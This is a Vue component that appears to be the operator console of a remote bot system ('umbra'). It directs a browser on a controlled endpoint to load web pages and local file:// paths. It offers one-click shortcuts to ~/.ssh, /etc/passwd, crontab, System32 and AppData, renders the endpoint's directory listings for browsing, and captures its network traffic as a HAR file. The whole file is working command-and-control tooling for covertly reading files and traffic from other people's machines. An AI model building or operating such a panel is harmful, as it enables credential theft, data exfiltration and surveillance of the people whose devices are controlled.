<script setup lang="ts">
import { computed, onBeforeUnmount, onMounted, ref, watch } from 'vue'
import { remote } from '@/api/endpoints'
import Btn from '@/components/ui/Btn.vue'
import {
  type DirEntry,
  type PreviewKind,
  detectPlatform,
  fileSystemHint,
  instrumentRenderedHTML,
  isUnviewable,
  looksLikeDirIndex,
  normalizeURL,
  parentURL,
  parseDirIndex,
  previewKind,
  urlExtension,
} from '@/composables/useRemoteUrl'

const props = defineProps<{ botId: string; userAgent: string }>()

type RemoteResult = {
  html?: string
  title?: string
  url?: string
  error?: string
  dataURL?: string
  contentType?: string
  size?: number
  fetchError?: string
} & Record<string, unknown>

const url = ref('')
const result = ref<RemoteResult | null>(null)
const error = ref<string | null>(null)
const notice = ref<string | null>(null)
const sending = ref(false)
const harLoading = ref(false)
const viewMode = ref<'rendered' | 'raw'>('rendered')

async function captureHAR(): Promise<void> {
  harLoading.value = true
  error.value = null
  notice.value = null
  try {
    const out = await remote.captureHAR(props.botId, 15000)
    if (out?.error) {
      error.value = String(out.error)
      return
    }
    const blob = new Blob([JSON.stringify(out.har ?? out, null, 2)], { type: 'application/json' })
    const href = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = href
    a.download = `umbra-${props.botId}.har`
    a.click()
    URL.revokeObjectURL(href)
    notice.value = `HAR captured (${out.entries ?? 0} entries). The endpoint showed a debugging banner while attached.`
  } catch (e) {
    error.value = e instanceof Error ? e.message : 'HAR capture failed'
  } finally {
    harLoading.value = false
  }
}

const platform = computed(() => detectPlatform(props.userAgent))
const platformLabel = computed(() => ({
  windows: 'Windows',
  mac: 'macOS',
  linux: 'Linux',
  unknown: 'Unknown',
})[platform.value])

const normalizedURL = computed(() => normalizeURL(url.value, platform.value))
const normalizedDiffers = computed(
  () => normalizedURL.value !== url.value.trim() && url.value.trim() !== '',
)

const placeholder = computed(() =>
  platform.value === 'windows' ? 'example.com   |   C:\\Users\\…   |   https://…'
  : platform.value === 'mac'   ? 'example.com   |   /Users/…   |   https://…'
  : platform.value === 'linux' ? 'example.com   |   /home/…   |   https://…'
  : 'example.com   |   /path/to/file   |   https://…',
)

const shortcuts = computed(() => {
  switch (platform.value) {
    case 'windows':
      return [
        { label: 'C:\\',          url: 'file:///C:/' },
        { label: 'Users',         url: 'file:///C:/Users/' },
        { label: 'Desktop',       url: 'file:///C:/Users/' },
        { label: 'Downloads',     url: 'file:///C:/Users/' },
        { label: 'AppData',       url: 'file:///C:/Users/' },
        { label: 'Program Files', url: 'file:///C:/Program%20Files/' },
        { label: 'ProgramData',   url: 'file:///C:/ProgramData/' },
        { label: 'Temp',          url: 'file:///C:/Windows/Temp/' },
        { label: 'System32',      url: 'file:///C:/Windows/System32/' },
        { label: 'Hosts',         url: 'file:///C:/Windows/System32/drivers/etc/hosts' },
      ]
    case 'mac':
      return [
        { label: '/',             url: 'file:///' },
        { label: 'Users',         url: 'file:///Users/' },
        { label: 'Applications',  url: 'file:///Applications/' },
        { label: 'Library',       url: 'file:///Library/' },
        { label: '~/Library',     url: 'file:///Users/' },
        { label: '~/.ssh',        url: 'file:///Users/' },
        { label: '/etc',          url: 'file:///etc/' },
        { label: '/var/log',      url: 'file:///var/log/' },
        { label: 'tmp',           url: 'file:///tmp/' },
        { label: 'hosts',         url: 'file:///etc/hosts' },
      ]
    case 'linux':
      return [
        { label: '/',          url: 'file:///' },
        { label: '/home',      url: 'file:///home/' },
        { label: '/root',      url: 'file:///root/' },
        { label: '/etc',       url: 'file:///etc/' },
        { label: '/var/log',   url: 'file:///var/log/' },
        { label: '/opt',       url: 'file:///opt/' },
        { label: '/tmp',       url: 'file:///tmp/' },
        { label: '.ssh',       url: 'file:///home/' },
        { label: '.config',    url: 'file:///home/' },
        { label: 'hosts',      url: 'file:///etc/hosts' },
        { label: 'crontab',    url: 'file:///etc/crontab' },
        { label: 'passwd',     url: 'file:///etc/passwd' },
      ]
    default:
      return [
        { label: '/',    url: 'file:///' },
        { label: '/etc', url: 'file:///etc/' },
        { label: '/tmp', url: 'file:///tmp/' },
      ]
  }
})

const rawJSON = computed(() =>
  result.value ? JSON.stringify(result.value, null, 2) : '',
)

const resultURL = computed(
  () => (result.value?.url as string | undefined) ?? null,
)
const parentTarget = computed(() =>
  resultURL.value ? parentURL(resultURL.value) : null,
)
const canGoUp = computed(() => parentTarget.value !== null)

// Renderer routing. In priority order:
//   1. binary preview (dataURL captured by extension) → native <img> /
//      <embed> / <video> / <audio>
//   2. directory listing → native Vue list (clickable, themed)
//   3. arbitrary HTML → sandboxed iframe with click-trap injected
const previewSrc = computed<{ kind: PreviewKind; src: string } | null>(() => {
  const r = result.value
  if (!r?.dataURL || typeof r.dataURL !== 'string') return null
  const kind = previewKind(r.url ?? '', r.contentType ?? null)
  if (!kind) return null
  return { kind, src: r.dataURL }
})
const dirEntries = computed<DirEntry[] | null>(() => {
  if (previewSrc.value) return null
  const html = (result.value?.html as string | undefined) ?? ''
  const u = resultURL.value ?? ''
  if (!looksLikeDirIndex(u, html)) return null
  return parseDirIndex(html, u)
})
const renderedHTML = computed(() => {
  if (previewSrc.value || dirEntries.value) return ''
  const raw = (result.value?.html as string | undefined) ?? ''
  const base = resultURL.value ?? normalizedURL.value
  return raw ? instrumentRenderedHTML(raw, base) : ''
})

const fetchSizeLabel = computed(() => {
  const s = result.value?.size as number | undefined
  if (typeof s !== 'number' || s <= 0) return ''
  if (s < 1024) return `${s} B`
  if (s < 1024 * 1024) return `${(s / 1024).toFixed(1)} KB`
  return `${(s / 1024 / 1024).toFixed(1)} MB`
})

async function navigateTo(target: string): Promise<void> {
  const t = (target ?? '').trim()
  if (!t) return
  if (sending.value) return
  if (isUnviewable(t)) {
    notice.value = `Skipped: .${urlExtension(t)} files trigger a download instead of rendering.`
    return
  }
  url.value = t
  await go()
}

async function go(): Promise<void> {
  const target = normalizedURL.value
  if (!target) return
  sending.value = true
  error.value = null
  notice.value = null
  result.value = null
  try {
    const r = await remote.navigate(props.botId, target)
    result.value = (r ?? {}) as RemoteResult
    const isEmpty = !result.value.html && !result.value.error && !result.value.dataURL && !result.value.fetchError
    if (isEmpty && Object.keys(result.value).length === 0) {
      error.value = 'Empty response — the bot may lack file:// access or the page could not be captured.'
      result.value = null
    } else if (result.value.error) {
      error.value = String(result.value.error)
    }
    if (result.value && !result.value.html) viewMode.value = 'raw'
    else viewMode.value = 'rendered'
  } catch (e) {
    error.value = e instanceof Error ? e.message : 'navigate failed'
  } finally {
    sending.value = false
  }
}

async function goUp(): Promise<void> {
  if (!parentTarget.value) return
  await navigateTo(parentTarget.value)
}

async function stop(): Promise<void> {
  await remote.stop(props.botId)
  result.value = { stopped: true } as RemoteResult
  viewMode.value = 'raw'
}

// Click trap inside the rendered iframe (HTTP pages only — directory
// listings are short-circuited by dirEntries above).
function onMessage(e: MessageEvent): void {
  const data = e.data as { type?: string; url?: string } | null
  if (!data || data.type !== 'cc-remote-nav') return
  const target = String(data.url ?? '')
  if (!target) return
  void navigateTo(target)
}

onMounted(() => window.addEventListener('message', onMessage))
onBeforeUnmount(() => window.removeEventListener('message', onMessage))

watch(() => props.botId, () => {
  url.value = ''
  result.value = null
  error.value = null
  notice.value = null
})

function entryIcon(e: DirEntry): string {
  if (e.isDir) return '📁'
  if (e.unviewable) return '⛔'
  const ext = urlExtension(e.url)
  if (['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'ico', 'avif', 'bmp'].includes(ext)) return '🖼'
  if (['mp4', 'webm', 'mov', 'mkv', 'm4v'].includes(ext)) return '🎬'
  if (['mp3', 'wav', 'flac', 'm4a', 'ogg'].includes(ext)) return '🎵'
  if (['pdf'].includes(ext)) return '📄'
  if (['html', 'htm', 'xml', 'json', 'js', 'ts', 'css', 'md', 'txt', 'log', 'csv', 'yaml', 'yml', 'sh', 'py', 'go', 'rs'].includes(ext)) return '📝'
  return '📦'
}

function entryClick(e: DirEntry, event?: MouseEvent): void {
  if (event && (event.metaKey || event.ctrlKey || event.shiftKey)) {
    // Modifier-click: copy URL instead of navigating.
    void navigator.clipboard?.writeText?.(e.url).catch(() => {})
    notice.value = `Copied: ${e.url}`
    return
  }
  if (e.unviewable) {
    notice.value = `Skipped: .${urlExtension(e.url)} files trigger a download instead of rendering.`
    return
  }
  void navigateTo(e.url)
}
</script>

<template>
  <!-- One short header strip + one large viewer below. The viewer takes
       the rest of the visible page so the operator doesn't have to
       scroll up/down to read it. -->
  <div class="flex flex-col gap-2 min-h-[calc(100vh-280px)]">
    <!-- Compact control strip. UA folded into a tooltip on the OS pill;
         normalized URL preview only renders when it actually differs. -->
    <div class="surface px-3 py-2 space-y-2">
      <div class="flex items-center gap-2">
        <span
          class="inline-flex items-center px-1.5 h-7 rounded text-[10px] font-medium border whitespace-nowrap"
          :class="platform === 'unknown'
            ? 'border-border-subtle text-fg-faint'
            : 'border-accent/30 text-accent bg-accent/5'"
          :title="userAgent || 'Unknown user agent'"
        >{{ platformLabel }}</span>

        <input
          v-model="url"
          type="text"
          autocomplete="off"
          spellcheck="false"
          :placeholder="placeholder"
          class="flex-1 min-w-0 h-7 px-2 bg-bg-base border border-border-subtle rounded text-[12px] mono focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent/40 placeholder:text-fg-faint"
          @keyup.enter="go"
        />

        <Btn variant="primary" size="sm" :loading="sending" @click="go">Go</Btn>
        <Btn variant="subtle" size="sm" @click="stop">Stop</Btn>
        <Btn variant="ghost" size="sm" :loading="harLoading" title="Capture HAR via chrome.debugger (shows a debugging banner on the endpoint)" @click="captureHAR">HAR</Btn>
        <Btn
          v-if="canGoUp"
          variant="ghost"
          size="sm"
          :title="`Up to ${parentTarget}`"
          @click="goUp"
        >↑</Btn>
      </div>

      <!-- Subline: shortcuts left, normalize hint right. -->
      <div class="flex items-center gap-2 text-[11px] mono">
        <span class="text-fg-faint shrink-0">Quick:</span>
        <button
          v-for="s in shortcuts"
          :key="s.url"
          class="px-1.5 py-0.5 rounded border border-border-subtle text-fg-muted hover:text-accent hover:border-accent/40 transition-colors"
          :title="s.url"
          @click="navigateTo(s.url)"
        >{{ s.label }}</button>

        <span class="ml-auto flex items-center gap-2 text-fg-faint min-w-0">
          <template v-if="normalizedDiffers">
            <span class="text-fg-muted shrink-0">→</span>
            <span class="truncate" :title="normalizedURL">{{ normalizedURL }}</span>
            <span
              class="px-1 py-0.5 rounded text-[10px] shrink-0"
              :class="/^file:/.test(normalizedURL)
                ? 'bg-accent/10 text-accent'
                : 'bg-success/10 text-success'"
            >{{ /^file:/.test(normalizedURL) ? 'fs' : 'web' }}</span>
          </template>
          <template v-else>
            <span class="opacity-70">hint: {{ fileSystemHint(platform) }}</span>
          </template>
        </span>
      </div>

      <p v-if="error" class="text-danger text-[11px] mono break-all">{{ error }}</p>
      <p
        v-if="notice"
        class="text-[11px] mono text-fg-muted break-all bg-bg-base border border-border-subtle rounded px-2 py-0.5"
      >{{ notice }}</p>
    </div>

    <!-- Viewer. Whatever the result is, the viewer takes the remaining
         vertical space — operators never have to scroll past a noisy
         header to see it. -->
    <div v-if="result" class="surface flex flex-col flex-1 min-h-0">
      <!-- Result header: title + url + view toggle, all on one row. -->
      <div class="flex items-center gap-2 px-3 h-8 border-b border-border-subtle text-[11px]">
        <span
          v-if="result.title"
          class="font-medium truncate"
          :title="String(result.title)"
        >{{ result.title }}</span>
        <span
          v-if="result.url"
          class="mono text-fg-faint truncate"
          :title="String(result.url)"
        >{{ result.url }}</span>

        <span class="ml-auto flex items-center gap-1">
          <button
            v-if="result.html"
            class="px-1.5 py-0.5 rounded border transition-colors text-[10px]"
            :class="viewMode === 'rendered'
              ? 'border-accent text-accent'
              : 'border-border-subtle text-fg-faint hover:text-fg-base'"
            @click="viewMode = 'rendered'"
          >Rendered</button>
          <button
            class="px-1.5 py-0.5 rounded border transition-colors text-[10px]"
            :class="viewMode === 'raw'
              ? 'border-accent text-accent'
              : 'border-border-subtle text-fg-faint hover:text-fg-base'"
            @click="viewMode = 'raw'"
          >Raw</button>
        </span>
      </div>

      <!-- Binary preview: image / pdf / video / audio captured as a
           data URL by the bot. Rendered with the right native element
           so file:// images don't have to load through a sandboxed
           iframe (which Chrome blocks). -->
      <div
        v-if="viewMode === 'rendered' && previewSrc"
        class="flex-1 min-h-0 overflow-auto bg-bg-base grid place-items-center p-3"
      >
        <img
          v-if="previewSrc.kind === 'image'"
          :src="previewSrc.src"
          class="max-w-full max-h-full object-contain"
          alt=""
        />
        <embed
          v-else-if="previewSrc.kind === 'pdf'"
          :src="previewSrc.src"
          type="application/pdf"
          class="w-full h-full min-h-[60vh]"
        />
        <video
          v-else-if="previewSrc.kind === 'video'"
          :src="previewSrc.src"
          controls
          class="max-w-full max-h-full"
        />
        <audio
          v-else-if="previewSrc.kind === 'audio'"
          :src="previewSrc.src"
          controls
          class="w-full max-w-2xl"
        />
        <span
          v-if="fetchSizeLabel"
          class="absolute bottom-2 right-3 text-[10px] mono text-fg-faint bg-bg-overlay px-1.5 py-0.5 rounded border border-border-subtle"
        >{{ fetchSizeLabel }}</span>
      </div>

      <!-- Fetch failed (typically: file too large for inline preview). -->
      <div
        v-else-if="viewMode === 'rendered' && result.fetchError"
        class="flex-1 min-h-0 grid place-items-center text-fg-muted text-[12px] mono p-4 text-center"
      >
        <div>
          <div class="text-danger mb-1">Could not inline preview</div>
          <div class="text-fg-faint">{{ result.fetchError }}</div>
          <div v-if="fetchSizeLabel" class="text-fg-faint mt-1">{{ fetchSizeLabel }}</div>
        </div>
      </div>

      <!-- Native file browser for directory listings. -->
      <div
        v-else-if="viewMode === 'rendered' && dirEntries"
        class="flex-1 min-h-0 overflow-auto bg-bg-base"
      >
        <ul class="divide-y divide-border-subtle">
          <li v-if="canGoUp">
            <button
              class="w-full flex items-center gap-3 px-3 py-1.5 text-left hover:bg-bg-hover transition-colors text-[12px]"
              @click="goUp"
            >
              <span class="text-[14px] w-5 text-center">↑</span>
              <span class="mono text-fg-muted">..</span>
              <span class="ml-auto text-[10px] text-fg-faint">parent</span>
            </button>
          </li>
          <li v-for="e in dirEntries" :key="e.url">
            <button
              class="w-full flex items-center gap-3 px-3 py-1.5 text-left hover:bg-bg-hover transition-colors text-[12px] group"
              :class="e.unviewable ? 'opacity-60' : ''"
              :title="e.url"
              @click="entryClick(e, $event)"
            >
              <span class="text-[14px] w-5 text-center">{{ entryIcon(e) }}</span>
              <span
                class="mono truncate"
                :class="e.isDir
                  ? 'text-accent group-hover:underline'
                  : e.unviewable
                    ? 'text-fg-faint'
                    : 'text-fg-base group-hover:text-accent'"
              >{{ e.name }}</span>
              <span
                v-if="e.unviewable"
                class="px-1 py-0.5 rounded bg-bg-overlay border border-border-subtle text-[9px] uppercase tracking-wider text-fg-faint shrink-0"
              >dl</span>
              <span class="mono text-[10px] text-fg-faint ml-auto shrink-0">{{ e.size || '—' }}</span>
              <span class="mono text-[10px] text-fg-faint w-32 text-right shrink-0 truncate">{{ e.mtime }}</span>
            </button>
          </li>
        </ul>
        <div
          v-if="dirEntries.length === 0"
          class="grid place-items-center h-32 text-fg-faint text-[12px]"
        >Empty directory</div>
      </div>

      <!-- HTTP / arbitrary HTML in a sandbox. allow-scripts is required
           so the injected click trap can postMessage out; we deliberately
           skip allow-same-origin so the iframe stays in a null origin. -->
      <iframe
        v-else-if="viewMode === 'rendered' && renderedHTML"
        :srcdoc="renderedHTML"
        sandbox="allow-scripts"
        referrerpolicy="no-referrer"
        class="flex-1 min-h-0 w-full bg-white"
      />

      <!-- Raw JSON. -->
      <pre
        v-else-if="viewMode === 'raw'"
        class="flex-1 min-h-0 mono text-[11px] bg-bg-base p-2 whitespace-pre-wrap break-all overflow-auto"
      >{{ rawJSON }}</pre>
    </div>

    <div
      v-else-if="!sending"
      class="surface flex-1 min-h-[200px] grid place-items-center text-fg-faint text-[12px]"
    >
      Type a URL or path above and hit Go.
    </div>
  </div>
</template>
